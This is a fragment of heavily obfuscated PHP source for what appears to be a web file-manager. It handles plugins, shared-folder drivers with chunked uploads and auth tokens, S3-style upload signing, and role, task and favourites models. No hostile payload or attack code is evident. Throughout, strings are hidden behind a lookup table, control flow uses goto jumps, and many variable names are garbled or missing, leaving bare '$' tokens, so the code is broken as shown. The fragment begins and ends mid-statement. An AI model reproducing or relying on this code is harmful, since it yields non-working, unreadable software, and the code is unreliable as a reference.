$ߙ) ? !1 : !0; } if ($Լ && !Action($⦈[2310])->checkAuth($)) { return !1; } return !0; } public function unInstall($) { $ܱɷ =& $_SERVER[ܮ]; $ = $this->loadList($); if (file_exists(PLUGIN_DIR . $)) { Hook::apply($ . $ܱɷ[2311]); } $this->remove($[$ܱɷ[487]]); } public function changeStatus($밹, $ܣ) { $ =& $_SERVER[ܮ]; $ = $this->loadList($밹); if ($ܣ) { Hook::apply($밹 . $[2312]); } $this->update($[$[487]], array($[2313] => $ܣ)); } public function appRegist($ŗ, $ѣ) { $ =& $_SERVER[ܮ]; $ءˬ = $this->loadList($ŗ); if ($ءˬ) { $this->update($ءˬ[$[487]], array($[2305] => $ѣ)); } else { $ٗ٣ = array($[32] => $ŗ, $[2305] => $ѣ, $[848] => 0, $[6] => $this->getConfigDefault($ŗ)); $this->insert($ٗ٣); } } public function getConfigDefault($Ћ) { $ሣ =& $_SERVER[ܮ]; $ = array(); $ = $this->getPackageJson($Ћ); if (!$ && is_array($[$ሣ[2314]])) { return $; } foreach ($[$ሣ[2314]] as $ => $) { if (!isset($[$ሣ[451]]) || isset($[$])) { continue; } $[$] = $[$ሣ[451]]; } return $; } public function getPackageJson($) { return Hook::apply($ . $_SERVER[ܮ][2315]); } public function getConfig($Ν, $ܜ = false) { $ =& $_SERVER[ܮ]; $ = array(); $ぜ = $this->loadList($Ν); if ($ぜ && is_array($ぜ[$[6]])) { $ = $ぜ[$[6]]; } if (!$ || $ܜ) { $ = $this->getConfigDefault($Ν); } return $; } public function setConfig($퉸, $מ = false) { $ =& $_SERVER[ܮ]; $İכ = $this->loadList($퉸); if (!$İכ) { return !1; } $ = $İכ[$[6]]; if ($מ == !1) { $ = array(); $מ = $this->getConfigDefault($퉸); } foreach ($מ as $鹣 => $) { $[$鹣] = is_string($) ? trim($) : $; } $this->update($İכ[$[487]], array($[6] => $)); } public function viewList() { $ܟ =& $_SERVER[ܮ]; $Ĝ = $this->loadList(); $this->pluginScan($Ĝ); $Ĝ = $this->loadPluginList(); $ق = array(); foreach ($Ĝ as $ɿ => $®) { $Ɂ = $®; unset($®[$ܟ[2305]], $®[$ܟ[6]]); $ޑ = PLUGIN_DIR . $®[$ܟ[32]] . $ܟ[2307]; if (!is_file($ޑ)) { continue; } $ = Hook::apply($®[$ܟ[32]] . $ܟ[2315]); if (!is_array($)) { continue; } $ق[$ɿ] = array_merge($®, $); if ($Ɂ[$ܟ[6]][$ܟ[1891]] != $[$ܟ[1865]]) { Hook::apply($®[$ܟ[32]] . $ܟ[2312]); $Ɂ[$ܟ[6]][$ܟ[1891]] = $[$ܟ[1865]]; $this->update($®[$ܟ[487]], array($ܟ[6] => $Ɂ[$ܟ[6]])); } } return $ق; } private function loadPluginList() { $򘐑 =& $_SERVER[ܮ]; $ɱ = $this->loadList(); if (strtolower(MOD) == $򘐑[2316]) { return $ɱ; } $߈ = Hook::trigger($򘐑[2317], $ɱ); if ($ɱ && !$߈) { die; } return $߈ ? $߈ : $ɱ; } private function pluginScan($) { $ȧة =& $_SERVER[ܮ]; recursion_dir(PLUGIN_DIR, $ő, $ˈ, 0); foreach ($ő as $Ē) { $Ӱ = get_path_this($Ē); if (isset($[$Ӱ]) || !file_exists($Ē . $ȧة[2318]) || !file_exists($Ē . $ȧة[2307])) { continue; } Hook::apply($Ӱ . $ȧة[2312]); } } } goto e; có: define($_SERVER[ܮ][317], 3); define($_SERVER[ܮ][318], 1); define($_SERVER[ܮ][319], 0); goto f쬣; B: class PathDriverDriverShareOuter extends PathDriverBase { public function __construct($) { $ģѾ =& $_SERVER[ܮ]; parent::__construct(); $this->uploadChunkSize = 1024 * 1024 * 2; $this->pathParse = $; $ = Model($ģѾ[686])->getInfo($[$ģѾ[487]]); $ꎤ = _get($, $ģѾ[580]); $χ = Model($ģѾ[587])->authMake(_get($, $ģѾ[1551])); if (!$) { IO::errorTips(LNG($ģѾ[1552]), !1); } if (!$χ) { IO::errorTips(LNG($ģѾ[1553]), !1); } if ($ꎤ && is_string($ꎤ)) { $ꎤ = json_decode($ꎤ, !0); } if (!$ꎤ || !$χ) { return; } $this->_config = array($ģѾ[1357] => rtrim($[$ģѾ[1357]], $ģѾ[8]) . $ģѾ[8], $ģѾ[1554] => $ģѾ[1462] . $ꎤ[$ģѾ[1555]] . $ģѾ[499], $ģѾ[576] => $, $ģѾ[580] => $ꎤ, $ģѾ[1556] => $χ, $ģѾ[1557] => substr(APP_HOST, 0, 8) == $ģѾ[217], $ģѾ[1558] => Model($ģѾ[591])->authCheck($χ[$ģѾ[503]], AuthModel::AUTH_VIEW, !1), $ģѾ[1559] => Model($ģѾ[591])->authCheck($χ[$ģѾ[503]], AuthModel::AUTH_EDIT, !1)); $this->authToken = $this->requestAuthToken(); } public function allowAction($ٻ) { $ =& $_SERVER[ܮ]; $ = $this->_config; if (!$) { return !1; } $΅ = array($[1560] => $[$[1558]], $[1561] => $[$[1558]], $[1386] => $[$[1558]], $[107] => $[$[1559]], $[1562] => $[$[1559]], $[1334] => $[$[1559]], $[1563] => !1, $[429] => !1, $[1564] => !1, $[1565] => !1); return $΅[$ٻ]; } public function listPath($, $՞َ = false) { return $this->request($_SERVER[ܮ][1566], array($)); } public function setContent($υ͓, $݈ = '') { return $this->request($_SERVER[ܮ][1567], array($υ͓, $݈)); } public function getContent($) { return $this->_fileSubstr($); } public function fileSubstr($, $, $) { return $this->_fileSubstr($, $, $); } public function download($, $) { return $this->_download($, $); } public function isFileOutServer() { return !1; } public function fileOut($, $ = false, $֓ = false, $ = '') { $ϊ =& $_SERVER[ܮ]; $this->fileOutLink($this->_fileLink($, ($ ? $ϊ[1568] . $ : $ϊ[12]) . ($ ? $ϊ[1569] : $ϊ[12]))); } public function fileOutImage($, $ڂ = 250) { $this->fileOutLink($this->_fileLink($, $_SERVER[ܮ][1570] . $ڂ)); } public function fileOutLink($Å) { header($_SERVER[ܮ][172] . $this->urlAuto($Å)); die; } public function exist($) { $ = $this->_info($); return $ ? !0 : !1; } public function isFile($) { $Τ =& $_SERVER[ܮ]; $ʝ = $this->_info($); return _get($ʝ, $Τ[33], $Τ[12]) == $Τ[230]; } public function isFolder($ߦ­) { $ =& $_SERVER[ܮ]; $ = $this->_info($ߦ­); return _get($, $[33], $[12]) == $[78]; } public function size($ξ) { $Á = $this->_info($ξ); return _get($Á, $_SERVER[ܮ][79], 0); } public function info($奰) { return $this->_info($奰); } public function infoAuth($) { return $this->_info($); } public function infoFull($ːɟ) { return $this->_info($ːɟ); } public function infoFullSimple($ޑ) { return $this->_info($ޑ); } public function infoWithChildren($) { return $this->_info($, !0); } public function has($̞ܗ, $򅡕 = false, $џ = false) { $̠ =& $_SERVER[ܮ]; $೵χ = $this->_info($̞ܗ); if (!$೵χ) { return !1; } if ($򅡕) { return array($̠[239] => $೵χ[$̠[239]], $̠[240] => $೵χ[$̠[240]]); } return $ľ ? $೵χ[$̠[239]] > 0 : $೵χ[$̠[240]] > 0; } public function mkfile($, $ = '', $ = REPEAT_RENAME) { return $this->request($_SERVER[ܮ][1543], array($, $, $)); } public function mkdir($ݕ, $Н = REPEAT_SKIP) { return $this->request($_SERVER[ܮ][1544], array($ݕ, $Н)); } public function remove($򰶼) { return $this->request($_SERVER[ܮ][1334], array($򰶼)); } public function rename($פ, $ě) { return $this->request($_SERVER[ܮ][1547], array($פ, $ě)); } public function moveSameAllow() { } public function copy($, $벭, $ҁ = REPEAT_REPLACE, $ق = false) { return $this->request($_SERVER[ܮ][641], array($, $벭, $ҁ)); } public function move($, $Ѧ, $͂ = REPEAT_REPLACE, $՘ = false) { return $this->request($_SERVER[ܮ][643], array($, $Ѧ, $͂)); } public function uploadLink($, $ = 0) { $䫊 =& $_SERVER[ܮ]; $ = IO::init($GLOBALS[$䫊[7]][$䫊[87]]); $̞ؖ = $this->pathApiEncode($->path); $ = $this->requestMakeUrl($䫊[1571], array($䫊[87] => $̞ؖ)); return array($䫊[1572] => $); } public function upload($, $, $ = false, $ڙ = REPEAT_REPLACE) { $ =& $_SERVER[ܮ]; if (filesize($) < $this->uploadChunkSize) { return $this->request($[107], array($, $, $ڙ)); } $ǵ = $this->uploadHashCheck($, $, $ڙ); if ($ǵ) { return $ǵ; } $ = @filesize($); $޽ = $this->uploadChunkSize; $ڝ = ceil($ / $޽); $ = 0; while ($ < $ڝ) { $ϲԶ = IO::fileSubstr($, $ * $޽, $޽); $ێ = $this->tempFile($[12], $ϲԶ); $ = array($[79] => $, $[1573] => $޽, $[1574] => $ڝ, $[1575] => $); $큰 = $this->uploadSend($, $ێ, $, $ڙ); $++; if (!$큰) { return !1; } } if (!is_array($큰) || empty($큰[$[595]])) { return !1; } return $this->pathApiDecode($큰[$[595]]); } private function uploadHashCheck($, $‏, $) { $ź̿ =& $_SERVER[ܮ]; $։ = IO::hashSimple($‏); $ = array($ź̿[1576] => $ź̿[1577], $ź̿[1536] => $։); $ = $this->uploadSend($, $ź̿[12], $, $); $ߺ = _get($, $ź̿[595], array()); $ = _get($ߺ, $ź̿[1578]); if (!is_array($) || !$[$ź̿[563]]) { return !1; } $᫖ = IO::hashMd5($‏); if ($[$ź̿[563]] != $᫖) { return !1; } if ($[$ź̿[595]][$ź̿[1579]]) { $this->uploadChunkSize = $[$ź̿[595]][$ź̿[1579]]; } $ = array($ź̿[1576] => $ź̿[1580], $ź̿[1537] => $᫖, $ź̿[1536] => $։); $ = $this->uploadSend($, $ź̿[12], $, $); if (!is_array($) || empty($[$ź̿[595]])) { return !1; } return $this->pathApiDecode($[$ź̿[595]]); } private function uploadSend($б, $, $, $Û = '') { $ը =& $_SERVER[ܮ]; $[$ը[32]] = get_path_this($б); $[$ը[87]] = $this->pathApiEncode(get_path_father($б)); if ($Û) { $[$ը[1581]] = $Û; } if ($) { $[$ը[230]] = $ը[1399] . $; } return $this->requestSend($ը[1571], $); } protected function pathApiEncode($) { $懔 =& $_SERVER[ܮ]; $肃 = $this->_config[$懔[1554]]; $ = strlen($肃); if (substr($, 0, $) == $肃) { return $; } return $肃 . ltrim($, $懔[8]); } protected function pathApiDecode($缡) { $ =& $_SERVER[ܮ]; $ = $this->_config[$[1554]]; $ = strlen($); if (substr($缡, 0, $) !== $) { return $缡; } return $this->_config[$[1357]] . ltrim(substr($缡, $), $[8]); } private function pathInfoParse(&$νޖ) { $㍖ =& $_SERVER[ܮ]; $Ǻ = $this->_config; $ = $Ǻ[$㍖[576]]; if (!$νޖ || !is_array($νޖ)) { return $νޖ; } static $ͼ = array(); $͋Ü = $ͼ[$[$㍖[687]]]; if (!is_array($͋Ü)) { $ = LNG($㍖[1582]); $Ӝ = $Ǻ[$㍖[580]][$㍖[90]]; $ = parse_url($Ǻ[$㍖[580]][$㍖[1583]]); $ԯ = $Ǻ[$㍖[580]][$㍖[1584]]; $͋Ü = array($㍖[1585] => $Ӝ[$㍖[32]] . $㍖[1065] . $ԯ . $㍖[1399] . $[$㍖[206]] . $㍖[1067], $㍖[1586] => $ . $㍖[1134] . $Ǻ[$㍖[580]][$㍖[1583]] . $㍖[1587] . LNG($㍖[1588]) . $㍖[1134] . $ԯ, $㍖[1589] => LNG($㍖[1590]) . $㍖[1591] . $Ǻ[$㍖[580]][$㍖[1583]] . $㍖[285] . LNG($㍖[1592]) . $㍖[1591] . $Ӝ[$㍖[602]], $㍖[1584] => array($㍖[32] => $ԯ, $㍖[1593] => $㍖[1594]), $㍖[1595] => Action($㍖[1541])->shareTargetMake($[$㍖[1551]])); $ͼ[$[$㍖[687]]] = $͋Ü; } unset($νޖ[$㍖[191]]); unset($νޖ[$㍖[604]]); unset($νޖ[$㍖[188]]); unset($νޖ[$㍖[589]]); $νޖ[$㍖[1596]] = !0; $νޖ[$㍖[232]] = $Ǻ[$㍖[1558]]; $νޖ[$㍖[233]] = $Ǻ[$㍖[1559]]; $νޖ[$㍖[502]] = $Ǻ[$㍖[1556]]; $νޖ[$㍖[1584]] = $͋Ü[$㍖[1584]]; $νޖ[$㍖[1597]] = $[$㍖[231]]; $νޖ[$㍖[1598]] = $[$㍖[88]]; $νޖ[$㍖[1599]] = $͋Ü[$㍖[1589]]; $νޖ[$㍖[1595]] = $͋Ü[$㍖[1595]]; $νޖ[$㍖[687]] = $[$㍖[687]]; $܊ = explode($㍖[8], trim($νޖ[$㍖[602]], $㍖[8])); $܊[0] = $͋Ü[$㍖[1585]]; $νޖ[$㍖[602]] = implode($㍖[8], $܊); if (count($܊) > 1) { unset($νޖ[$㍖[1595]]); } if (count($܊) == 1) { if ($νޖ[$㍖[33]] == $㍖[78]) { $νޖ[$㍖[32]] = $͋Ü[$㍖[1585]]; } array_set_value($νޖ, $㍖[1600], $͋Ü[$㍖[1586]]); } $քՐ = array($㍖[1601], $㍖[1521], $㍖[1602], $㍖[1603]); foreach ($քՐ as $) { $ = $this->urlAuto(_get($νޖ, $, $㍖[12])); if ($) { array_set_value($νޖ, $, $); } } } private function _info($, $׏ = false) { $霬 =& $_SERVER[ܮ]; $ȭԂ = $this->_config; if (!$ȭԂ) { return !1; } static $ӳ = array(); if (isset($ӳ[$]) && is_array($ӳ[$])) { return $ӳ[$]; } if ((!$ || !trim($, $霬[8])) && !$׏) { $ބ = $ȭԂ[$霬[580]][$霬[90]]; if (!$ބ) { return !1; } $ބ[$霬[602]] = $霬[12]; $ބ[$霬[87]] = $ȭԂ[$霬[1357]]; $this->pathInfoParse($ބ); return $ބ; } $ = $this->request($霬[1604], array($, $׏)); $ӳ[$] = $; return $; } private function _fileSubstr($, $倧 = 0, $ = -1) { $ =& $_SERVER[ܮ]; $͒ = $this->_fileLink($); if (!$͒) { return !1; } $󠖆 = !1; if ($ > 0) { $ɤ = $ + $ - 1; $󠖆 = array($[1605] . $ . $[476] . $ɤ); } $ = url_request($͒, $[1606], !1, $󠖆); return $[$[848]] ? $[$[1393]] : !1; } private function _download($ϣ, $Ŕՠ) { $Ċ = $this->_fileLink($ϣ); if (!$Ċ) { return !1; } Downloader::start($Ċ, $Ŕՠ); return $Ŕՠ; } private function _fileLink($횱, $ = '') { $ =& $_SERVER[ܮ]; $찝 = $this->pathApiEncode($횱); return $this->requestMakeUrl($[1607], array($[87] => $찝)) . $; } private function urlAuto($) { $ű˒ =& $_SERVER[ܮ]; if (!$) { return $; } $ = parse_url($); $ = $; if ($this->_config[$ű˒[1557]] && $[$ű˒[205]] == $ű˒[149] && Input::check($[$ű˒[1608]], $ű˒[1609])) { $ = $ű˒[217] . substr($, 7); } $ڛ = $ű˒[1610] . rawurlencode(rtrim($this->config[$ű˒[1554]], $ű˒[8])); if (strstr($, $ڛ)) { $ = strstr($, $ű˒[76]) ? $ű˒[284] : $ű˒[76]; $ = $ . $ . $ű˒[1611] . $this->authToken; } return $; } private function request($ʟ, $) { $ =& $_SERVER[ܮ]; if (!is_array($)) { $ = array(); } for ($ڣ䛶 = 0; $ڣ䛶 < 4; $ڣ䛶++) { if (!isset($[$ڣ䛶])) { $[$ڣ䛶] = $[12]; } } $ = array($[1604] => array($[1612] => $[1604], $[1613] => $[1614], $[1615] => $[87], $[1356] => array($[1616] => array(array($[87] => $[0])), $[1617] => $[1] ? $[91] : $[12])), $[1566] => array($[1612] => $[1618], $[1613] => $[87], $[1615] => $[1619], $[1356] => array($[87] => $[0], $[428] => _get($GLOBALS[$[7]], $[428], $[91]), $[439] => _get($GLOBALS[$[7]], $[439], $[1620]))), $[1621] => array($[1612] => $[1622], $[1613] => $[87], $[1615] => $[1623], $[1356] => array($[87] => $[0])), $[1567] => array($[1612] => $[1624], $[1613] => $[87], $[1625] => $[1626], $[1356] => array($[87] => $[0], $[168] => $[1])), $[1543] => array($[1612] => $[1543], $[1613] => $[87], $[1625] => $[595], $[1356] => array($[87] => $[0], $[168] => $[1], $[1581] => $[2])), $[1544] => array($[1612] => $[1544], $[1613] => $[87], $[1625] => $[595], $[1356] => array($[87] => $[0], $[1581] => $[2])), $[641] => array($[1612] => $[1627], $[1613] => $[1628], $[1625] => $[1629], $[1356] => array($[1616] => array(array($[87] => $[0])), $[87] => $[1], $[1581] => $[2])), $[643] => array($[1612] => $[1630], $[1613] => $[1628], $[1625] => $[1629], $[1356] => array($[1616] => array(array($[87] => $[0])), $[87] => $[1], $[1581] => $[2])), $[1334] => array($[1612] => $[1631], $[1613] => $[1614], $[1615] => $[87], $[1356] => array($[1616] => array(array($[87] => $[0])))), $[1547] => array($[1612] => $[1632], $[1613] => $[87], $[1625] => $[595], $[1356] => array($[87] => $[0], $[1633] => $[1])), $[107] => array($[1612] => $[1571], $[1613] => $[87], $[1625] => $[595], $[1356] => array($[87] => get_path_father($[0]), $[230] => $[1] ? $[1399] . $[1] : $[12], $[32] => get_path_this($[0]), $[1581] => $[2]))); $נ = $[$ʟ]; if (!$נ) { return !1; } $ = $נ[$[1356]]; $ሴ = explode($[50], $נ[$[1613]]); foreach ($ሴ as $֮) { $ٸۛ = $this->pathApiEncode(_get($, $֮)); array_set_value($, $֮, $ٸۛ); } if ($ʟ == $[1547] && trim($נ[$[1356]][$[87]], $[8]) == trim($this->_config[$[1357]], $[8])) { return $נ[$[1356]][$[87]]; } $쳼 = $this->requestSend($נ[$[1612]], $); if (!$쳼) { return !1; } $ߑ = $쳼[$[1393]]; if ($נ[$[1625]]) { $ߑ = _get($쳼, $נ[$[1625]]); } if (is_string($ߑ) && !$נ[$[1615]]) { return $this->pathApiDecode($ߑ); } if (!is_array($ߑ) || !$ߑ) { return $ߑ; } $ = explode($[50], $נ[$[1615]]); foreach ($ as $֮) { $ = explode($[10], $֮); $Ί = array_search($[1634], $); if ($Ί === !1) { $ٸۛ = $this->pathApiDecode(_get($ߑ, $֮)); array_set_value($ߑ, $֮, $ٸۛ); if ($ʟ == $[1604] && $֮ == $[87]) { $this->pathInfoParse($ߑ); } if ($ʟ == $[1566] && $֮ == $[1635]) { $this->pathInfoParse($ߑ[$[973]]); } if ($ʟ == $[1566]) { $ߑ[$[1636]] = array(); } continue; } $ = implode($[10], array_slice($, $Ί + 1)); $ø = array(); if ($Ί === 0) { $ø =& $ߑ; } if ($Ί === 1) { $ø =& $ߑ[$[0]]; } if ($Ί === 2) { $ø =& $ߑ[$[0]][$[1]]; } foreach ($ø as $֮ => $Ԃ) { $ٸۛ = $this->pathApiDecode(_get($Ԃ, $)); array_set_value($ø[$֮], $, $ٸۛ); $this->pathInfoParse($ø[$֮]); } unset($ø); } return $ߑ; } private function requestMakeUrl($۩, $Ż = '') { $ =& $_SERVER[ܮ]; $ = $this->_config; if (!$this->authToken) { return !1; } $ = $this->requestQuery($Ż, !0) . $[1637] . $this->authToken; $ܑ = rtrim($[$[580]][$[1583]], $[8]) . $[1638] . $۩; return $ܑ . $[1639] . rawurlencode($[$[580]][$[1555]]) . $; } private function requestAuthToken() { $ֱ =& $_SERVER[ܮ]; $ = $this->_config; if (!$) { return !1; } $ٟ = _get($, $ֱ[1640]); $ = array_find_by_field($[$ֱ[580]][$ֱ[1595]], $ֱ[1641], $ٟ); if (!$) { return !1; } $礓 = $[$ֱ[1642]] . $ֱ[1643] . $[$ֱ[1347]]; $Ȗ = $ֱ[1644] . $this->pathParse[$ֱ[487]] . $ֱ[476] . $礓; $ = Cache::get($Ȗ); if ($) { return $; } $ = Mcrypt::encode($礓, $ֱ[1645]); Cache::set($Ȗ, $, 3600 * 24 * 60); return $; } private function requestQuery($ຮ = '', $ = false) { if (!$ຮ || !is_array($ຮ)) { return $ຮ; } foreach ($ຮ as $ۗ => $՛) { if (is_array($՛)) { $ຮ[$ۗ] = json_encode($՛); } } return $ ? $_SERVER[ܮ][284] . http_build_query($ຮ) : $ຮ; } private function requestSend($, $) { $ =& $_SERVER[ܮ]; $Ü = $this->requestMakeUrl($); if (!$Ü) { return !1; } $Ӓ = url_request($Ü, $[288], $this->requestQuery($), !1, !1, !0); $ = $Ӓ[$[1393]]; if (!is_array($) || !$ || !$[$[1403]] || intval($[$[1403]]) > 500) { $נ = is_array($) ? $[$[1393]] : $ . $[12]; if (!$Ӓ[$[848]]) { $נ .= $[1646] . $Ӓ[$[1403]] . $[175]; } IO::errorTips($נ, !1); return !1; } return $; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($˨) { parent::__construct($˨); $this->setSignVersion($_SERVER[ܮ][247]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($겁ש) { parent::__construct($겁ש); $this->setSignVersion($_SERVER[ܮ][247]); } public function uploadFormData($盤, $ = 3600) { $Է =& $_SERVER[ܮ]; $ = $Է[229]; $ = $Է[257]; $̐ = $Է[62]; $ = gmdate($Է[258]); $ڠµ = gmdate($Է[259]); $² = $Է[260]; $ǎ = $ . $Է[12]; $֌ = $Է[261]; $ = array($this->accessKey, $ڠµ, $this->region, $̐, $²); $ɾ = implode($Է[8], $); $᫽ = array($Է[262] => gmdate($Է[1526], strtotime($Է[264])), $Է[265] => array(array($Է[266] => $this->bucket), array($Է[306] => $), array($Է[267], $Է[268], $Է[12]), array($Է[267], $Է[269], $Է[12]), array($Է[267], $Է[307], $Է[12]), array($Է[270] => $֌), array($Է[271] => $ɾ), array($Է[272] => $), array($Է[273] => $), array($Է[274] => $ǎ))); $ǀ = base64_encode(json_encode($᫽)); $ = hash_hmac($Է[275], $ڠµ, $Է[276] . $this->secret, !0); $ = hash_hmac($Է[275], $this->region, $, !0); $؏݆ = hash_hmac($Է[275], $̐, $, !0); $֐Ш = hash_hmac($Է[275], $², $؏݆, !0); $ = hash_hmac($Է[275], $ǀ, $֐Ш); $ד = array($Է[246] => $Է[12], $Է[294] => $Է[12], $Է[306] => $, $Է[270] => $֌, $Է[277] => $ǀ, $Է[308] => $ɾ, $Է[309] => $, $Է[310] => $, $Է[311] => $ǎ, $Է[312] => $, $Է[206] => $this->getHost()); return $ד; } } goto c; f: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\162\x6f\x6c\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\x74\x68", "\x6c\141\x62\145\x6c", "\144\x69\x73\x70\154\x61\x79", "\x73\x79\x73\x74\x65\155", "\x64\145\163\143", "\151\x67\156\157\x72\x65\105\170\x74", "\151\x67\156\157\162\x65\x46\x69\x6c\145\x53\151\x7a\x65", "\x61\144\155\x69\156\x69\163\x74\x72\x61\x74\157\162", "\163\157\162\164"); public function listData($߹ӹ = false, $ܧ = "\x73\157\x72\164", $ = false) { $ܭ =& $_SERVER[ܮ]; $ً = parent::listData($߹ӹ, $ܧ, $); if (!$߹ӹ) { foreach ($ً as $ͯ => $) { if ($[$ܭ[2376]] == 1) { $ً[$ͯ][$ܭ[540]] = LNG($ܭ[2661]); } } } return $ً; } public function update($ˆԔ, $ٻ) { $Ͻ =& $_SERVER[ܮ]; $Ȭ = parent::listData($ˆԔ); $ = $this->findByName($ٻ[$Ͻ[32]]); if (!$Ȭ || $ && $[$Ͻ[487]] != $Ȭ[$Ͻ[487]]) { return !1; } if ($[$Ͻ[2376]] == 1) { $ٻ = array($Ͻ[32] => $ٻ[$Ͻ[32]], $Ͻ[2203] => $ٻ[$Ͻ[2203]]); } $this->filterAuth($ٻ[$Ͻ[502]]); return parent::update($ˆԔ, $ٻ); } public function remove($۞) { $ѫ = parent::listData($۞); if (!$ѫ || $ѫ[$_SERVER[ܮ][189]]) { return !1; } return parent::remove($۞); } public function add($֐) { $ =& $_SERVER[ܮ]; $܊ = $֐[$[32]]; if ($this->findByName($܊)) { return !1; } $à = array($[509] => $܊, $[2188] => $[12], $[2184] => $[2192], $[2662] => 1, $[2187] => 0, $[2663] => 0, $[2186] => $this->getSort()); $֐ = array_merge($à, $֐); $this->filterAuth($֐[$[502]]); return parent::insert($֐); } private function getSort() { $Ġ =& $_SERVER[ܮ]; $簸 = parent::listData(); $ُ = array_to_keyvalue($簸, $Ġ[12], $Ġ[2204]); return empty($ُ) ? 0 : max($ُ) + 1; } private function filterAuth(&$ҝ) { $˭ =& $_SERVER[ܮ]; $ = array(); $ = array_filter(explode($˭[50], $ҝ)); foreach ($ as $ҝ) { $Ī = explode($˭[10], $ҝ); if ($Ī[0] == $˭[2664] && $Ī[1] != $˭[1309]) { $ϕ = $Ī[0] . $˭[10] . $Ī[1] . $˭[2665]; if (!in_array($ϕ, $)) { $[] = $ϕ; } } $[] = $ҝ; } $ҝ = implode($˭[50], $); } public function findRoleDefault() { $ú =& $_SERVER[ܮ]; $ø = parent::listData(); $ʠ = !1; foreach ($ø as $̖) { if (!$̖ || $̖[$ú[2202]] == $ú[228] || $̖[$ú[2376]] == 1) { continue; } if (strstr($̖[$ú[502]], $ú[2666])) { continue; } if (!strstr($̖[$ú[502]], $ú[2667])) { continue; } if (!$ʠ) { $ʠ = $̖; continue; } $Ĭ = explode($ú[50], $ʠ[$ú[502]]); $ = explode($ú[50], $̖[$ú[502]]); if (count($Ĭ) > count($)) { $ʠ = $̖; } } return $ʠ ? $ʠ[$ú[487]] : $ú[12]; } public function sort($П, $ܟµ) { return parent::update($П, $ܟµ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\164\141\x73\x6b\x4c\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x74\x79\x70\x65", "\145\166\x65\x6e\x74", "\164\x69\x6d\x65", "\144\x65\x73\143", "\x73\x79\x73\x74\x65\155", "\145\x6e\x61\x62\154\x65", "\x6c\141\163\x74\122\x75\156", "\x73\157\162\164"); public function listData($ = false, $ = "\x73\157\x72\x74", $ʇ = false) { return parent::listData($, $, $ʇ); } public function add($ʭ) { $آ܆̞ =& $_SERVER[ܮ]; $ = $this->findByName($ʭ[$آ܆̞[32]]); if ($) { return !1; } $ʭ[$آ܆̞[1928]] = 0; $ʭ[$آ܆̞[2204]] = $this->getSort(); return parent::insert($ʭ); } private function getSort() { $ɥ =& $_SERVER[ܮ]; $ = parent::listData(); $͕к = array_to_keyvalue($, $ɥ[12], $ɥ[2204]); return empty($͕к) ? 0 : max($͕к) + 1; } public function update($, $) { $¿£ =& $_SERVER[ܮ]; $ = $this->listData($); $ = $this->findByName($[$¿£[32]]); if (!$ || $ && $[$¿£[487]] != $[$¿£[487]]) { return !1; } return parent::update($, $); } public function remove($б, $ = false) { $ϋ =& $_SERVER[ܮ]; $ = $this->listData($б); if (!$) { return; } if (!$ && $[$ϋ[189]] == $ϋ[91]) { return !1; } return parent::remove($б); } public function enable($, $) { return $this->update($, array($_SERVER[ܮ][2656] => $)); } public function run($Χ) { return $this->update($Χ, array($_SERVER[ܮ][2668] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\166"; protected function cacheFunctionAlias($ڎ) { $ =& $_SERVER[ܮ]; return array($[2296] => array(USER_ID, $[2669])); } protected function ___listData() { $ =& $_SERVER[ܮ]; $Ϩ = array($[1968] => USER_ID, $[573] => 0); $ŶԀ = $[2670]; $ = $this->field($ŶԀ)->where($Ϩ)->order($[2671])->select(); return $ ? $ : array(); } protected function resetCache() { } protected function listView() { $ =& $_SERVER[ܮ]; $ = $this->listData(); $Ϯ = array_filter_by_field($, $[33], $[505]); $Ԭ = array_to_keyvalue($Ϯ, $[12], $[87]); if (!$Ԭ) { return $; } $ = 2000; $ȪҐ = array($[506] => array($[507], $Ԭ)); $ = Model($[939])->listSource($ȪҐ, $); $ = array_merge($[$[86]], $[$[85]]); $ = array_to_keyvalue($, $[191]); foreach ($ as $ܻ״ => $翌) { $ҭ֙ = $[$翌[$[87]]]; $ҭ֙ = $ҭ֙ ? $ҭ֙ : array(); $[$ܻ״] = array_merge($ҭ֙, $翌); } return $; } protected function addFav($β, $ = '', $ܚ = "\163\x6f\x75\x72\x63\145") { $ =& $_SERVER[ܮ]; $ᎏ = array($[1968] => USER_ID, $[573] => 0, $[511] => $ܚ, $[510] => $β); if ($this->where($ᎏ)->find()) { return !1; } $ᎏ = array($[1968] => USER_ID, $[573] => 0); $컣 = $this->where($ᎏ)->max($[2204]); if (!$컣) { $컣 = 0; } if (!$ && $ܚ == $[505]) { $ۿ = Model($[1534])->where(array($[506] => $β))->find(); if (!$ۿ) { return !1; } $ = $ۿ[$[32]]; } $ = $this->getAutoName($); $簕 = array($[1968] => USER_ID, $[573] => 0, $[509] => $, $[510] => $β, $[511] => $ܚ, $[2186] => $컣 + 1); return $this->add($簕); } protected function remove($) { $頑 =& $_SERVER[ܮ]; $䡝 = array($頑[1968] => USER_ID, $頑[508] => $); return $this->where($䡝)->delete(); } protected function removeByName($ͣ) { $˳ =& $_SERVER[ܮ]; $̬ = array($˳[1968] => USER_ID, $˳[509] => $ͣ, $˳[573] => 0); return $this->where($̬)->delete(); } protected function rename($, $鮮) { $Ѡ =& $_SERVER[ܮ]; if ($ == $鮮) { return !1; } $ē = $this->getAutoName($鮮); if ($鮮 != $ē) { return !1; } $׾® = array($Ѡ[1968] => USER_ID, $Ѡ[573] => 0, $Ѡ[32] => $); return $this->where($׾®)->save(array($Ѡ[32] => $鮮)); } protected function resetSort($) { $ֵȵ =& $_SERVER[ܮ]; $ = is_array($) ? $ : array(); $ = array($ֵȵ[1968] => USER_ID); for ($ń = 0; $ń < count($); $ń++) { $[$ֵȵ[508]] = $[$ń]; $this->where($)->save(array($ֵȵ[2186] => $ń + 1)); } return !0; } protected function moveTop($) { $ũ =& $_SERVER[ܮ]; $ = array($ũ[1968] => USER_ID, $ũ[573] => 0); $ = $this->where($)->where(array($ũ[32] => $))->find(); if (!$) { return; } $ = $this->field($ũ[487])->where($)->order($ũ[2671])->select(); $ = array_to_keyvalue($, $ũ[12], $ũ[487]); $с = $; $ = array_remove_value($, $[$ũ[487]]); array_unshift($, $[$ũ[487]]); return $this->resetSort($); } protected function moveBottom($Θ) { $㎩޽ 